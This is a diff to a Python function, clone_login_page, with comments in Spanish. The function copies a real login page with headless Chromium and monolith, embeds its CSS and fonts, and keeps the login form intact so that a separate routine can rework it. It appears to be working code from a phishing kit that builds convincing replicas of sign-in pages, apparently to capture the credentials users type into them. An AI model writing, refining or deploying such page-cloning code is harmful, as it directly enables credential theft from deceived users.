@@ -372,13 +372,11 @@ def clone_login_page(url, log_fn=None):
             if dump_result.returncode == 0 and len(dump_result.stdout) > 500:
                 _log("[*] Chromium dump-dom OK (" + str(len(dump_result.stdout)) + " bytes)")
 
-                # Adaptar form ANTES de monolith: monolith elimina <input>/<form>
-                # al procesar el HTML, así que parchamos primero y luego monolith
-                # solo se encarga de incrustar CSS/fuentes.
-                patched_html, form_found = _patch_form(dump_result.stdout, _log)
-
-                # monolith lee el HTML de stdin y resuelve recursos relativos
-                # usando la URL como base. --insecure ignora errores TLS.
+                # Estrategia: monolith procesa el HTML original para incrustar
+                # CSS/fuentes como data-URI. Pero monolith destruye <form>/<input>
+                # al re-serializar el DOM. Solución: extraemos los <style> y <link>
+                # incrustados que genera monolith y los inyectamos en el HTML
+                # original (que sí conserva el form intacto).
                 mono_result = subprocess.run(
                     [
                         monolith_bin,
@@ -387,20 +385,44 @@ def clone_login_page(url, log_fn=None):
                         "-b", url,
                         "--insecure",
                     ],
-                    input=patched_html,
+                    input=dump_result.stdout,
                     capture_output=True,
                     text=True,
                     timeout=120,
                 )
 
                 if mono_result.returncode == 0 and len(mono_result.stdout) > 1000:
-                    _log("[+] monolith OK (" + str(len(mono_result.stdout)) + " bytes) — CSS/fuentes embebidas")
-                    if form_found:
-                        # Form ya adaptado, solo limpiar scripts externos y <base>
-                        return _adapt_form(mono_result.stdout, _log)
-                    else:
-                        # No habia form: _adapt_form inyectara el overlay
-                        return _adapt_form(mono_result.stdout, _log)
+                    _log("[+] monolith OK (" + str(len(mono_result.stdout)) + " bytes) — extrayendo CSS embebido")
+
+                    # Extraer estilos incrustados de monolith (data-URI base64)
+                    try:
+                        from bs4 import BeautifulSoup as BS
+                        soup_mono = BS(mono_result.stdout, "html.parser")
+                        # Recoger todos los <style> con data-URI (fuentes/CSS embebidos)
+                        embedded_styles = []
+                        for tag in soup_mono.find_all("style"):
+                            if tag.string and ("data:" in tag.string or len(tag.string) > 500):
+                                embedded_styles.append(str(tag))
+                        # Recoger <link rel=stylesheet> con data-URI href
+                        for tag in soup_mono.find_all("link", rel=lambda r: r and "stylesheet" in r):
+                            href = tag.get("href", "")
+                            if href.startswith("data:"):
+                                embedded_styles.append(str(tag))
+
+                        # Inyectar estilos embebidos en el HTML original (con form)
+                        soup_orig = BS(dump_result.stdout, "html.parser")
+                        head = soup_orig.find("head")
+                        if head and embedded_styles:
+                            injection = BS("".join(embedded_styles), "html.parser")
+                            head.append(injection)
+                            _log("[+] " + str(len(embedded_styles)) + " bloques CSS/fuentes inyectados en HTML original")
+                        
+                        combined_html = str(soup_orig)
+                    except Exception as e:
+                        _log("[!] Error extrayendo CSS de monolith: " + str(e))
+                        combined_html = dump_result.stdout
+
+                    return _adapt_form(combined_html, _log)
                 else:
                     stderr_preview = mono_result.stderr[:200] if mono_result.stderr else "sin output"
                     _log("[!] monolith fallo (rc=" + str(mono_result.returncode) + "): " + stderr_preview)
